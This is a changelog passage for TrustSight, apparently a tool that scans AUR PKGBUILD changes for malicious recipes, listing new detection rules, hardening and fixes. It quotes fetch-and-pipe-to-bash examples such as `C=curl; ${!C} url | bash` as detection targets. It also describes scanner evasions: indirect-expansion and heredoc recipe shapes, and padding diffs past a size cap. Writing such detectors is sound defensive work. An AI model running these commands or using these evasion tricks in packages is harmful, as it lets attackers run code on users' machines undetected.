  `configuring-rules-and-weights.md` and `index.md`. The calibration figures in
  `reading-a-report.md` were re-derived rather than adjusted: zero-rate 74.9% to
  69.1%, benign p95 30 to 45, test count 1,365 to 1,377.
- **Generators are record-preserving.** `gen_malicious_fixtures.py` no longer
  deletes diffs it does not own, `gen_injection_fixtures.py` merges with the
  existing record instead of overwriting it, and
  `gen_historical_holdout_fixtures.py` keeps curated entries verbatim.
  Regenerating any generator on a clean tree is now a no-op by construction.
- **R012 `user:` role marker relabelled as a negative control.** The engine
  deliberately excludes `user:` role markers (a question addressed to a model
  carries no instruction); the generator previously emitted
  `R012-v5.diff` as a positive, which failed the malicious-recall gate. It is
  now a documented negative (`must_not_fire: [R012, R013]`, `max_score: 0`).
- **`R029-known-dep-added` record dropped.** A vestigial placeholder
  (`must_fire: []`, `max_score: 0`, `known_packages` gate) with no rule
  implementation, no diff body, and no code path referencing it; keeping it
  would fabricate a fixture for a rule that does not exist.
- **Channel releases keep the canonical seed and prove their own plumbing.**
  The baselines workflow now checks the channel release for an existing
  `baseline-seed.tar.gz` before building: the canonical seed is
  maintainer-built from the full AUR mirror and uploaded, and CI rebuilds a
  lock-derived fallback only when it is missing (auditable but smaller, and
  never overwriting an uploaded seed). Every seed built by the published
  scripts now ships `trustsight-seed-v2/seed-provenance.json` (source mirror
  path and size, package, maintainer and observation counts, build timestamp
  and command line), written by `generate_seed.py --provenance-out` and
  copied into the archive by `build_hashed_seed.py --provenance`, so anyone
  can reproduce the seed and diff their record against the published one. A
  manual workflow run doubles as a pipeline test; see
   [publishing baselines](contributing/publishing-baselines.md#prepare-a-baseline-release).
- **Release tarballs no longer carry `packaging/`.** `export-ignore` keeps
  the PKGBUILD out of the GitHub source tarball, so the release artifact can
  no longer disagree with itself. The CI side of the checksum contract is
  v0.12.1: `release-pkgbuild.yml` computes the checksum from the served
  tarball, verifies it with `makepkg --verifysource`, and commits it to the
  default branch; `pkgbuild.yml` downloads the actual release tarball and
  fails the build on a checksum mismatch instead of building with
  `--skipchecksums`.
- **Machine-readable output stays machine-readable.** `review`, `inspect`,
  `history`, `list`, `corpus` and `ioc` in `--json` mode keep stdout a pure
  JSON document: warnings and progress events go to stderr, errors become a
  JSON error object with exit code 2, and `review --json` results carry an
  explicit `failed` flag, unconditional `suppressed_rules` and `ioc_matches`,
  and score fields only under `--score` and `--risk`. Negative `--limit`
  values and unknown `--type` values are rejected with a clean error instead
  of a traceback.
- **IOC and baseline handling hardened.** `ioc import` dedupes identical
  rows instead of crashing, keeps expired rows of a source across
  re-imports (`entries_skipped`), treats naive `expires_at` values as UTC,
  and reports malformed manifest versions or encodings as clean errors;
  `ioc update` honours `TRUSTSIGHT_OFFLINE`; `ioc export` refuses to
  overwrite an existing file; `ioc sources` drops the placeholder row. The
  seed and baseline import path rejects archive members that escape the
  extraction directory (absolute paths, `..` segments), `import-baseline`
  refuses a non-file path, and `db check` and `db backup` survive a corrupt
  database with readable errors and validate the backup output path.
- **`full-aur` refuses to do nothing silently.** An empty metadata fetch no
  longer clobbers the stored snapshot, fetch failures are wrapped in
  actionable errors, a missing `--sign` key is a hard error, invalid watch
  intervals are coerced to the floor, and a failed watch cycle is retried
  instead of killing the watcher. `config set` validates keys and value
  types and `config show` tolerates hand-edited non-integer weights;
  `override` tolerates null reasons and dedupes new entries; `forget
  --prune` refuses partial RPC replies and handles EOF on confirmation;
  discovery reports a friendly error when pacman is missing from PATH; the
  display layer escapes rich markup in untrusted messages.

### Added

- **B7, a change summary on every result.** `changes` on `PackageFact` and in
  the JSON, sibling to `findings` and `coverage_gaps`, so "nothing fired" cannot
  read as "nothing happened". Plain strings, no severity, never in
  `triggered_rules`; `.SRCINFO` and `.gitignore` suppressed as always-noisy.
- **B8, findings are checkable.** Content rules carry `file` and `line`; the 40
  rules that legitimately cannot (temporal, maintainer, corpus, longitudinal,
  dependency) declare an evidence class in `findings.NON_CONTENT_RULES` rather
  than omitting the field silently.
- **B9, no output grants permission to skip review.** A denylist over the
  rendering templates, which caught a live violation on its first run: the
  no-findings verdict ended "No risk signals fired." with no direction to
  review, and now reads "No published rule matched. Review the diff before
  building."
- **`scoring.FLAG_THRESHOLD`**, so the 20-point threshold is read rather than
  repeated.

### Fixed

- **Resolved rules lost their line numbers.** Fifteen shipped rules
  (`R001`, `R002`, `R003`, `R008`, `R012`, `R039`-`R045`, `R055`-`R057`)
  match `match_target = "resolved"`, and `apply_rules` looked a finding's
  location up in `line_map` by the finding's position in the compacted
  resolved list - but `line_map` is keyed by raw diff-line index, and the
  resolved list omits assignment lines, so the positions did not line up.
  Every resolved rule fired with no `file`/`line` (or, on a position
  collision, the wrong one). The tokenizer now records the raw diff-line
  index of each resolved string (`tokenize_and_resolve_indexed`), and
  `apply_rules` maps through it; `full_aur` gained the `line_map` it never
  passed. The B8 gate, which caught this in CI, now runs under
  `shipped_config()` so a local `rules.toml` that overrides a rule's
  `match_target` can never mask it again.

- **Three render bugs found by looking at the output, not by a gate.** The
  Score row printed the previous row's caption as the risk band (a `for label,
  value in rows` loop shadowed it); the tool's own `[cyan]` markup printed
  literally in the Rules Triggered rows, because it was passed to
  `Text.assemble`, which does not parse markup; and the declared-practice group
  left a ragged empty column for findings with no line number.

### Added (security model corrections)

- **B1 restated: determinism is algorithmic, not configurational.** "The same
  input always produces the same number" was false, and invited a Part D report
  under the nondeterminism clause: two operators with different `rules.toml` get
  different scores by design. Reports now carry a **`config_fingerprint`**, a
  digest over the effective ruleset, scoring weights, thresholds and active
  overrides, so the claim is checkable. Part D's clause now reads "the same
  input, under the same `config_fingerprint`, producing different numbers".
- **A14, the overarching resource guarantee.** A4 bounds what arrives, A5 what
  is matched, A6 what is expanded; together, no package-controlled input decides
  how much CPU, memory, network or disk this process uses. Every bound is a
  source constant rather than a function of the input, and every bound that
  drops content records a coverage gap, tying the guarantee to B2 so a bound can
  never be used as a quiet skip.
- **B9 inverted from denylist to structural requirement.** A denylist over
  phrasings is a treadmill. Every verdict now ends with a direction to review,
  and the primary gate asserts that the direction is **present** rather than
  that a phrasing is absent. Four of the five verdict paths were ending without
  one (first analysis, first analysis with versions, the FATAL path, and the
  signals path); FATAL now ends "Do not build this package. Inspect the diff and
  report it." The denylist is retained as a secondary check and is now scoped to
  **template text only**, via AST rather than a line regex, so a package named
  `safe-rs` or `clean-arch` cannot trip it. That is A7's separation applied to
  B9: templates are code-owned and checked, fields are package-owned and never
  checked.
- **A3 addendum: cloning executes nothing.** libgit2 runs no hooks on clone and
  TrustSight configures no `clean`, `smudge` or `fsmonitor` filter, the
  git-config paths where a fetch becomes an execution. Documented as a property
  of the library rather than a control this project adds.
- **A10 addendum: sanitisation is not transliteration.** A name built from
  homoglyphs renders as the characters it contains, because rewriting an
  identifier would misrepresent what is installed. Name-level confusability is a
  detection concern, not a rendering one.
- **Baseline import reports its delta** instead of warning on it: "N package(s)
  moved from no-history to warm". A threshold on "novelty dropped across many
  packages" would fire on the success case, since that is a baseline's entire
  function. A13's real defence is the bound on what a baseline may write.

### Fixed (audit pass)

- **`forget --prune` echoed database-stored package names raw.** The A10 gate
  exercised the review, inspect and corpus renders and not `forget`, `history`
  or `list`, so the one surface printing unsanitised names was outside it. Now
  cleaned, and the gate renders six surfaces instead of four.
- **`history` and `list` re-derived the band from the saved score**, so a run
  that `review` reported as `Inconclusive (incomplete analysis)` displayed a
  bare "Low" or "Medium" the next time it was listed, violating B2 on two
  surfaces. `scoring.stored_band()` now reads the band and gaps from the row's
  `fact_json`; rows written before that field existed fall back to the derived
  band and are reported as complete, which is the only honest thing to say
  about them. Band colour keys off the bare word via `display.band_colour()`.
- **The change summary never reported dependency changes.** Dead twice over:
  `fact.dependency_changes` was set by nothing, and `changes.summarise` read a
  `{op: names}` shape while `extract_dependency_changes` returns
  `{field: {added names}}`. Adding `depends=('qt6-svg')` now yields
  `depends: +qt6-svg`.
- **`DECLARED_DEFAULT` was defined and referenced nowhere**, so every declared
  practice rendered every time and B10's documented default-subset behaviour did
  not exist. Now applied: the surprising-by-absence set (`P002`, `P003`, `P005`)
  renders by default with "N more declared practice(s); --verbose to list them",
  and `P` findings no longer duplicate into the Rules Triggered block.
- **The calibration wording overclaimed.** `calibration_gates.py` re-computes
  benign p95 and malicious p5 on every push and nothing else, so the aggregate
  figures are a point-in-time measurement. `security.md` now says so, and
  `fire-rates.md` actually publishes the table it was said to publish.
- **The seed release path logs through a real logger.** `db.py` referenced a
  module `log` it never defined, masked until now by a broad exception
  handler, so failures while seeding from the release channel died without
  a reason; the module logger is defined and a test pins the failure path.
  `config.py`'s `\s` escape no longer triggers a SyntaxWarning, and
  `export.py` drops a dead assignment left over from the baseline export
  rework.

### Performance

- **Analysis is about 42% faster: 14.9 ms to 8.7 ms per diff**, and a full
  3246-diff corpus scan now completes in 31s. Detection is bit-identical: the
  calibration gates, the campaign fixtures and the whole suite were re-run after
  each change.
  - `tokenizer.resolve_added_lines` is memoised per thread. Twenty call sites in
    `analysis/` asked for the resolved form of the same diff and it was
    recomputed every time, about a third of the cost. Keyed on identity rather
    than equality, because hashing a multi-megabyte diff twenty times to avoid
    computing it twenty times is not a saving.
  - `rules._classify_enclosing_function` is memoised the same way, keyed on
    content because each of its fifteen callers holds its own copy.
  - `config.load_toml` gained `copy_result=False` for the six accessors whose
    callers treat the result as read-only. `load_rules` and `load_config` keep
    the deepcopy: `apply_rules` genuinely assigns to `rule["pattern"]`.
  - Both memos are thread-local. `review` analyses packages in a pool, and a
    shared cache would need its eviction sweep to be atomic with the insert; it
    is not, and a `KeyError` in a worker surfaces as "this package was NOT
    vetted". Five tests pin the properties that make the memos safe: no sharing
    between callers, no confusion between diffs, no leakage across threads, and
    no mutation of the shared config tables.

### Fixed

- **The truncation bypass.** Padding a diff past `max_diff_bytes` and appending
  the payload turned a High into a Low. `diff_truncated` was set, serialised,
  and consumed by nothing but a sentence prepended to the verdict. It is now a
  coverage gap, and `scan_diff` applies the same cap the git path always did.
- **`Inconclusive` was computed and then discarded.** Every CLI path re-derived
  the band with `risk_level(final_score)`, which cannot express it, so the
  downgrade never reached the output.
- **AUR-controlled text reached the terminal raw.** Package names, maintainer
  names, file paths and quoted evidence could clear the screen, forge a
  verdict, recolour a row, or abort the render of a whole review batch with an
  unbalanced Rich tag.
- **A seed could rewrite the database it was merged into.** `import_seed`
  copied `seed.metadata` wholesale with `INSERT OR REPLACE` and overwrote
  `maintainer_counts`. It is now limited to the two keys a seed owns, cannot
  raise a locally learned maintainer count (which would suppress R071/R090),
  and records the imported artifact's SHA-256 and origin.
- **A FATAL rule could be deleted from `rules.toml`.** `override.py` already
  refused to suppress a FATAL *finding*; deleting or downgrading the *rule* was
  unguarded. `config.enforce_fatal_rules()` now re-asserts the shipped FATAL
  set in memory at load, warns, and writes nothing back.
- **The AUR metadata fetch had no timeout and no response cap**, unlike every
  other fetch path. It is on the default `review` path, so it was the one that
  would hang.
- **Rule patterns ran on unbounded lines.** Input is clamped to 8 KiB per
  logical line before matching, which bounds every pattern at once. The clamp
  is itself a truncation seam, so a diff containing an over-length line now
  records the `line_truncated` coverage gap rather than skipping the tail
  silently.
- **`_MAX_EXPANSION_DEPTH` was declared and never applied.** Removed, along
  with a dead helper in `resolve_expansions`. A bound nothing enforces reads
  like a guarantee. The bounds that are real (passes, value length, line
  length, table size, and refusing `${!x}` and `${#x}`) are now stated as
  invariant A6.
- **Config lists became regex.** `hosts.toml` ports and TLDs are now escaped
  before being joined into the R047/R048 patterns.
- **`corpus pivot` read a snapshot from the working directory**, so the answer
  depended on where the command was run and a planted file could steer it. One
  location now, under the config directory.
- **Three more instances of one recurring failure**, now written up in
  [reviewing a security control](contributing/security-review.md): a control
  applied at one of several equivalent call sites, with the gate pointed at a
  covered one.
  - `terminal output is inert` exercised `review`'s renderer only.
    `_inspect_rich` interpolated a rule id raw and leaked escape sequences; the
    gate now renders through four paths and names them in its result, and
    `cli/corpus._render_pivot` was extracted from its command so it could be
    one of them.
  - Four of the five `PackageFact` producers set `coverage_gaps`. The
    first-analysis path declared `tree_analyzed=True` having read no tree at
    all and reported a bare "Low". The new `every result declares its coverage`
    gate walks the AST for every construction, so a sixth producer fails rather
    than shipping a false coverage claim.
  - `pacman -Sl <repo>` had no `--` separator, unlike the `pacman -Q` call
    beside it. The repo name is operator input rather than package input, so
    this is consistency rather than a hole, but the separator is free.
- **The line clamp only covered half the rule engine.** A5 claimed the 8 KiB
  per-line bound applied to every pattern "in a way that no per-pattern audit
  can". It applied to `apply_rules`, which runs the ~30 patterns in
  `rules.toml`, and not to the ~88 patterns emitted from `analysis/`, which
  match the diff text directly. Measured on one 5 MiB line: 0.17s through
  `apply_rules`, 15.06s through the code-emitted rules, an attacker-chosen
  multiplier on review time bounded only by `max_diff_bytes`. `rules.clamp_text`
  now clamps the text handed to the code rules at all three call sites,
  shortening lines without dropping them so line numbers stay aligned. Same
  input is now 0.54s end to end, with `line_truncated` still recorded. The gate
  was measuring `apply_rules` alone, which is why it reported the property as
  held; it now measures `scan_diff` end to end and asserts the gap is recorded,
  so bounding the work cannot silently bound the evidence.
- **The reserved-name guard covered one writer of three.** `upsert_package`
  refuses `__seed__` and any `__`-prefixed name; `save_package_profile` and
  `save_pkgbuild_snapshot` did not, and both are on the `import_baseline` path.
  AUR names may begin with an underscore, so `__seed__` is registrable. No leak
  into user-facing queries was reachable (those filter the sentinel), so this
  was a latent inconsistency rather than a demonstrated exploit. All three
  writers now refuse, `db.is_reserved_name` lets corpus callers skip instead of
  raising, and the baseline importer treats a rejected row like a nameless one:
  logged and skipped, never fatal to the import.
- **A heading rename could silently break every link to it.** Renaming a
  section leaves every sentence on the page true and quietly disconnects the
  claims that pointed at it, with nothing failing anywhere: the documentation
  form of skipping content without recording a coverage gap. It nearly happened
  when B2 was reworded. The `doc cross-references resolve` gate now walks every
  `docs/**` link, resolves the file and the anchor, and fails the build on a
  dangling one. Inline code and fenced blocks are excluded, since a rule
  pattern such as `(?<![^\x00-\x7F])[...]` contains `](...)` and is not a link.
- **Two `--help` tests asserted on styled bytes.** Rich renders an option's
  leading hyphen as its own span, so the literal `--repo` is not in the output
  even though the flag is there, and which spans Rich splits moves between
  versions. The assertions now strip styling with the project's own
  `safe_text.clean`, which makes them width- and version-independent and
  exercises the sanitiser at the same time.
- **`differ.map_diff_lines` corrupted filenames.** `lstrip("b/")` strips
  characters, not a prefix, so `+++ b/build.sh` reported findings against
  `uild.sh`.

### Changed

- **`docs/contributing/security-review.md`**, a new page: how to scope a gate so
  it covers the entry point an attacker reaches, the four times this project got
  it wrong, and a table of which gates enumerate the whole source and which
  sample a single path.
- **Punctuation normalised across the docs** to `: ; , () -`, with no em dashes,
  en dashes or spaced `--` anywhere. Pinned by `test_docs_use_standard_punctuation`,
  because it had drifted back three times.
- **`docs/security.md` reorganised around a thesis.** The page now opens with
  the position it is defending (TrustSight is the instrument panel, not the
  airworthiness certificate; a sensor that was never wired must not read the
  same as a sensor reporting zero) and the evidence taxonomy that follows from
  it, before the four parts that make it enforceable. The operative claim
  is that the tool must never move between taxonomy rows silently, which is
  what Part B's coverage rules and Part C's gates exist to prevent.
- **`--watch` is described in Part A.** A watch loop changes the volume of
  fetching, not its shape: per-request bounds still apply, plus an interval
  floor and an optional cycle count. The absence of any hook or notification
  command is now stated explicitly, along with the boundary such a hook would
  need if one is ever added, since it would receive attacker-influenced JSON.
- **`docs/security.md` states its assumptions.** The trust boundary is now
  explicit and complete: the Python runtime, the operating system, local
  filesystem permissions, the TLS trust store, CI, and the tool's dependencies
  (`rich`, `pygit2`, `typer`, `tldextract`, SQLite, `libc`) are all trusted
  rather than defended. If any of them is compromised, the page states, the
  model no longer applies. What was implicit is now the border.
- **Rendering has no model in it, and that is now a stated invariant.** Verdict
  text is a template keyed by rule id filled with named evidence fields;
  values are substituted, never re-expanded or evaluated, and no template comes
  from package-controlled text. The output path therefore has no network
  dependency, no nondeterminism, and no prompt-injection surface. R012 still
  detects injection aimed at whoever reads the diff.
- **Maturity numbers made exact across the docs.** `_MATURITY_THRESHOLD` is 50,
  so the Inconclusive gate at `maturity < 0.5` means fewer than 25 recorded
  analyses. Pages variously said "50 observations" or "approximately 25"; they
  now say both numbers and how they relate.
- **Documented claims corrected to match the code.** The `source_resolution`
  field named in four pages never existed; "no external API is involved" was
  false (four AUR endpoints, now stated precisely); the Inconclusive predicate
  was documented as stricter than it is; R122 is documented as having no call
  site rather than implying corpus-side coverage it does not have; the exit
  code table claimed a flag-driven exit that was never implemented, and
  `docs/guides/using-in-ci.md` gated on a JSON shape `review --json` does not
  emit.
- **The exit-code contract is now enforced, not just documented.** An
  operational failure exits 2 everywhere: `cli/main()` wraps the app so an
  uncaught failure exits 2 with a message on stderr, and the remaining
  operational `Exit(1)` sites (review discovery, inspect not-found, forget
  prune/abort, override add/remove, db check, lint-rules) now exit 2. Exit 1
  is no longer used by any command; a verdict still never changes the exit
  code.

### Added

- **R132: a command or shell named through `${!name}` indirection.**
  `C=curl; ${!C} url | bash` runs curl while the recipe carries no literal
  curl and no literal shell for R001/R002/R129/R121 to name, because the
  tokenizer refuses to evaluate indirection it cannot know statically.
  Flagging the indirection itself (CRITICAL, obfuscation, staged
  `anti_analysis`) closes that whole family; the benign `${!arr[@]}` and
  `${!prefix*}` key-and-name-listing forms are excluded by construction.
- **The evasion fixture corpus (`scripts/gen_evasion_fixtures.py`).** Recipe
  shapes that bypass the engine are written down *before* they are closed and
  kept as the record of what the engine can and cannot yet see. Six original
  evasions (indirect expansion, `+=`-accumulated commands and deps,
  heredoc-fed and heredoc-written recipes), of which five are now detected
  and relabelled into the recall corpus, plus three new open gaps filed for
  the rules that will close them: R133 (array-subscript routing), R134
  (nameref routing) and R135 (command-substitution spelling). Each fixture
  enforces its state in both directions: an open gap must fail its label,
  a relabelled fixture must pass it, so a patch that closes a gap turns
  `gate_known_gaps_unchanged` red instead of leaving a stale record.

### Changed

- **The source-bucket prior scores at its worst URL, not its sum.** Each
  added URL contributed its bucket modifier individually, so appending the
  same suspiciously hosted URL many times (the `discord_arch_electron`
  case: ~26 entries at +20 each) stacked into CRITICAL on the strength of a
  single weak fact. The prior is now the maximum modifier over all added
  URLs: one diff whose provenance is unknown, not thirty separate facts,
  which restores the calibration separation (benign p95 strictly below
  malicious p5). `homograph_attack` still dominates at +30, and trusted
  forges still contribute nothing.
- **The assignment resolver accumulates `+=`.** `_ASSIGNMENT_RE` now reads
  the operator: `=` is a fresh binding, `+=` appends to the current value
  (a fresh name starts empty, matching bash). A fetch command assembled
  across `C+=curl` / `C+=' https://…'` lines therefore resolves to a
  literal `curl https://… | bash` that R001 owns, instead of staying an
  opaque `$C` the literal-matching rules step over.
- **The synthetic fixtures now validate under the shipped config before
  writing.** `scripts/gen_malicious_fixtures.py` resolves labels against the
  same cold-DB, `shipped_config()` context `scan_malicious` runs in, so a
  rule that stops detecting fails at generation time, and a fixture whose
  label was hand-reconciled (R004/R009/R025/R026/R027/R039/R059/R128/R129/R130)
  can no longer be silently clobbered by a regenerate.

### Fixed

- **`depends+=` was invisible to the dependency rules.** Accumulated
  dependency declarations were never parsed as declarations, so a recipe
  that appended to `depends` cold showed no finding at all. The generator
  now keeps `evasion-depends-via-plus-eq` filed as an open gap (novelty
  rules are DB-backed and silent under the gates' cold DB) rather than
  pretending the parse gap is closed.

## [0.11.0] - 2026-07-30

### Added

- **`inspect` output redesigned.** Single Panel with "Rules Triggered" header, Score/Risk at bottom, `--score`/`--risk` independent flags.
- **`review` `--risk` flag.** Coloured border by risk level and Risk row.
- **Dedicated "Files changed" section** in both review and inspect, showing each file with `+`/`~`/`-` prefix.
- **`override wizard <package>`** command. Interactive rule suppression per package.
- **R081 (foreign package manager in install hooks) and R082 (shell obfuscation density ≥3 patterns) graduated from experimental** to enabled by default. Zero false positives on a 3243-diff benign corpus.

### Changed

- **`src/trustsight/analysis.py` (1080 lines) refactored** into `analysis/` package: `base.py`, `build.py`, `dependencies.py`, `maintainer.py`, `pipeline.py`, `structural.py`, `temporal.py`.
- **`src/trustsight/cli.py` (2035 lines) refactored** into `cli/` package: `admin.py`, `app.py`, `display.py`, `forget.py`, `history.py`, `inspect.py`, `list_cmd.py`, `review.py`.
- **`python-cryptography` promoted** from optdepends to hard dependency (resolves namcap warnings about uninstalled `cryptography` module at runtime).
- **`packaging/aur/README.md`** corrected: `python-tldextract` is in the `extra` repository, not the AUR.

### Fixed

- **`fetch_metadata(on_progress=...)` signature mismatch.** The `review` command passed an `on_progress` callback to `fetch_metadata()` but the function did not accept it, crashing with `TypeError` when the metadata-dump download path was taken. Added the `on_progress` parameter to `fetch_metadata()`.
- **Nested parameter expansions** in PKGBUILD variables now resolve correctly via brace-depth tracking.
- **`__seed__` sentinel** excluded from user-facing database queries. Unanalyzed packages show `-` instead of stale seed-derived scores.
- **Version display** contract enforced: `None` shows as `-`, unresolvable strings as `"unresolved"`, across all CLI output paths.
- **Conftest fixture conflict** resolved.

## [0.10.0] - 2026-07-29

### Added

- **Regression tests** for metadata-dispatch bugs (first-run sentinel, repo
  warnings in metadata path, cross-referencing repos, deduplication).
  7 new tests in `tests/test_cli.py`.
- **`optdepends`** for `python-cryptography` and `pyalpm` in
  `packaging/aur/PKGBUILD`.
- **Line mapping for findings.** `map_diff_lines()` maps diff line indices to
  file names and line numbers.  Findings from `apply_rules()` now carry
  `file`/`line` context propagated through `ScoreEntry` and `PackageFact`.
- **Per-file change tracking.** `DiffSummary.file_changes` lists every changed
  file with its status (`added`/`removed`/`modified`), excluding `.SRCINFO`
  and `.gitignore`.
- **Corpus analysis adapter.** `analyze_package_text()` analyzes raw old/new
  PKGBUILD text via `difflib.unified_diff`, enabling the full-AUR corpus
  pipeline (no git repository required).

### Changed

- **`get_installed_from_repo()`** rewired from `pacman -Q --repo` (which
  missed packages not tracked as repo-origin) to `pacman -Sl <repo>` +
  `pacman -Q`.  The old approach only found packages whose `pacman -Q` shows
  an explicit repository name; the new one lists the repo's contents via
  `-Sl` and cross-references with `-Q`.
- **Discovery for `review`** replaced AUR RPC calls with the local
  metadata-dump snapshot (`full-aur-meta.json`, from `full_aur/metadata.py`).
  Installed versions are compared against snapshot versions via `vercmp`
  instead of per-package AUR RPC `info` queries. Falls back to the RPC on
  failure.
- **Repo warnings** split into two distinct messages: `repo 'X' does not
  exist` (when `pacman -Sl` fails) and `repo 'X' exists but no packages from
  it are installed` (when the repo exists but `-Q` finds nothing).
- **`_get_installed_packages()`** now correctly cross-references repo
  packages and foreign packages, respecting `--repo`, `--foreign`, and
  `--all-repos` flags.  Previous implementation only collected foreign
  packages when a repo was specified.
- **First-run sentinel.** `_discover_packages()` returns `(None, 0)` on the
  first metadata fetch so that `review()` does not emit a duplicate
  "No outdated packages found" message.
- **Python >=3.11 required.** `requires-python` bumped from `>=3.10` to
  `>=3.11`. The `tomli` compat shim (`src/trustsight/_toml.py`) and its
  conditional dependency in `pyproject.toml` are removed. All imports use
  stdlib `tomllib`.
- **CI matrix** drops Python 3.10.


### Fixed

- **All 3 namcap warnings** resolved by removing the `tomli` dependency and
  adding `optdepends`.

### Removed

- **`watch` command.** Removed in favour of running `trustsight baseline
  build` via cron. The `baseline build` command already handles incremental
  updates (diff + process changed) when a prior metadata snapshot exists.
  Use `--json` for machine-parseable cron output.
- **`src/trustsight/_toml.py`** removed along with the `tomli` fallback for
  Python 3.10.

## [0.10.1] - 2026-07-29

### Added

- **`forget` command.** `trustsight forget <package>...` removes packages from
  the local database. Supports `--prune` (remove packages not in the AUR),
  `--dry-run` (preview without deleting), and `--yes` (skip confirmation).
  Cascading deletes across 7 database tables. Documented in
  `docs/reference/cli.md`.
- **AUR verification on `inspect`.** The `inspect` command now verifies a
  package exists in the AUR before analysis, with graceful fallback to cached
  local data when the AUR RPC is unreachable.

### Fixed

- **Nested parameter expansion in PKGBUILD variables.** The resolver now
  handles constructs like `${srcdir}/${pkgname}-${pkgver}` by recursively
  expanding nested variable references. `resolve_expansions()` and supporting
  helpers (`_expand_one()`, `_glob_to_regex()`, `_strip_affix()`) added to
  `tokenizer.py`. 20 regression tests.
- **`__seed__` sentinel leaking into listings.** The synthetic `__seed__`
  package (used for first-run detection) no longer appears in `list` output
  or other user-facing queries. `get_package_id()` and `get_package()`
  return `None` for reserved names; `upsert_package()` raises `ValueError`.
- **Unanalyzed packages showing `0/100 Low`.** The `inspect` and `review`
  commands now display `-` for score and risk when a package has
  not yet been analyzed, instead of misleading `0/100 Low`.
- **Empty version strings shown as `unresolved`.** Version strings that do
  not match the plausible-version regex (e.g. unresolved PKGBUILD variables)
  display as `unresolved` in all output paths.

### Changed

- **Test fixture import resolution.** `tests/conftest.py` inserts `src/` into
  `sys.path` so that pytest can resolve `trustsight` imports without relying
  on the installed package.

## [0.9.0] - 2026-07-28

### Removed

- **LLM integration.** `src/trustsight/llm.py` deleted; verdicts are now
  entirely deterministic using rule-specific templates in `verdict.py`.
  `openai>=1.0` and `[project.optional-dependencies] ollama` removed from
  `pyproject.toml`. The `--simple` flag on `review`/`inspect`, the `config
  setup` command, the `[llm]` config section, and the `TRUSTSIGHT_API_KEY` /
  `TRUSTSIGHT_BASE_URL` environment variables are all removed.

### Changed

- **Verdicts now deterministic.** Each rule description includes its rule ID
  in brackets, e.g. `"maintainer changed to 'bob' [R071]"`. The
  `fallback_verdict()` function renders from a `_TEMPLATES` registry keyed by
  `rule_id`, falling back to `entry.reason` if no template exists.

- **FATAL verdict punctuation.** The second sentence now begins with a capital
  letter for readability.

- **Packaging.** LLM optdepends (`python-openai`, `ollama`) removed from
  `packaging/aur/PKGBUILD` and `.SRCINFO`.

### Fixed

- **All 12+ documentation files** swept of LLM references. `--verbose` added
  to the commands table in `README.md`.

## [0.8.0] - 2026-07-27

### Added

- **Full-AUR corpus builder.** `trustsight baseline build` fetches the AUR
  metadata archive, downloads PKGBUILDs via cgit with snapshot tarball
  fallback, runs the full analysis pipeline, and persists results. Progress
  is saved every 1000 packages for `--resume`. `trustsight baseline import`
  merges a signed corpus artifact into the local database. `trustsight watch`
  polls the AUR metadata on a configurable interval and analyses only the
  changed packages, optionally firing alert hooks.

- **Property stability tracking.** Eleven per-package, per-key property
  dimensions are recorded on every analysis with a SHA-256 value hash and
  a `stable_for_n` counter (accumulates on identical observations, resets on
  change). Feeds longitudinal rules R094-R102.

- **Canonical reproducible serialisation.** `canonical_artifact_bytes()`
  produces byte-identical output from the same corpus inputs. The signed
  payload records the ruleset version, scorer version, and corpus cutoff
  in a deterministic manifest.

- **ed25519 artifact signing.** `build_artifact` accepts `--sign KEY`.
  `import_baseline()` verifies against the shipped public key and refuses
  unsigned artifacts by default (`--allow-unsigned` for local builds).

- **`config setup` interactive wizard.** Walks through provider choice
  (openai, ollama), endpoint, API key (masked), model name, and connection
  test.

- **`--simple` flag** on `review` and `inspect` to skip the LLM verdict.

- **First-run welcome banner.** Shown on first `review` when the novelty
  seed is imported, printing config path, database path, and next-step
  suggestions.

- **`config set` extended.** `model`, `timeout`, and `provider` keys now
  accepted alongside `api_key` and `base_url`.

### Changed

- **TemporalContext unifies both analysis paths.** The git-based and
  corpus-based paths share a single `TemporalContext` parameter that declares
  the clock source (`git_commit`, `aur_metadata`, `observation_history`)
  rather than deriving timestamps internally. The clock source is recorded on
  every `PackageFact` as `temporal_source`.

- **`history` suggests `inspect` for unanalysed packages.** Instead of
  `"not found in history"`, now says `"Run 'trustsight inspect X' first."`

### Fixed

- **LLM verdict always used in `inspect`.** Previously called
  `fallback_verdict()` unconditionally instead of `generate_verdict()`.
- **API exceptions and suppressed verdicts now logged at `warning` level.**
  Previously `debug` made them invisible.

## [0.7.2] - 2026-07-27

### Added

- **New CLI commands.** `trustsight list` lists all packages tracked in the
  database with their latest score, risk, version, and maintainer.
  `trustsight status` shows database health statistics (packages tracked,
  total analyses, effective observations, dependency corpus status).

- **Database maintenance commands.** `trustsight db check` runs `PRAGMA
  integrity_check`. `trustsight db vacuum` reclaims disk space from deleted
  rows. `trustsight db backup` creates a safe online backup via
  `sqlite3.backup()` without stopping the application.

- **AUR RPC response cache.** A new `aur_cache` table stores AUR version
  lookups so repeated reviews do not re-query the AUR server. Config key
  `[discovery] cache_ttl_minutes` controls freshness (default: 60 minutes;
  set to 0 to disable).

- **`inspect --verbose` flag.** Threaded through to both the rich and plain
  output paths. In JSON mode it includes the score breakdown in the output.

- **`PRAGMA busy_timeout=5000`.** The database connection now retries locked
  writes for 5 seconds instead of raising `OperationalError: database is locked`
  immediately.

### Changed

- **Pipelined analysis and LLM verdicts.** The batch-review path replaced its
  serial analysis loop with a `ThreadPoolExecutor` where each task runs
  `analyze_package()` followed immediately by `_verdict_for()` in the same
  thread. Analysis and LLM calls now overlap across workers instead of running
  strictly sequentially, reducing wall time by roughly
  `min(total_analysis, total_llm)` seconds.

- **AUR RPC queries are cached.** `get_aur_package_info()` checks the local
  cache before making HTTP requests; only packages not in cache (or whose
  cache entry has expired) reach the AUR server.

### Fixed

- **`_run_analysis_loop()` output indentation.** The rich-table and plain-text
  output branches were nested inside `if json_output:` (after its `return`),
  making them dead code. Restructured into a clean three-way branch.

## [0.7.1] - 2026-07-27

### Added

- **Database schema migration for `current_maintainer`.** A migration step
  (`_migrate` + `_ADDED_COLUMNS`) now safely adds columns that were introduced
  after the initial schema shipped. Existing databases created before
  `current_maintainer` existed will have it added on the first run, fixing a
  crash on upgrade.

- **Concurrent prefetch of AUR repositories.** The batch-review path clones or
  fetches all package repos in parallel before beginning analysis, so the
  network latency of 20 sequential fetches no longer dominates the runtime.

- **AUR RPC helpers.** `get_aur_package_info` and `get_aur_latest_versions`
  batch-query the AUR RPC interface, replacing individual per-package lookups
  and reducing network round-trips.

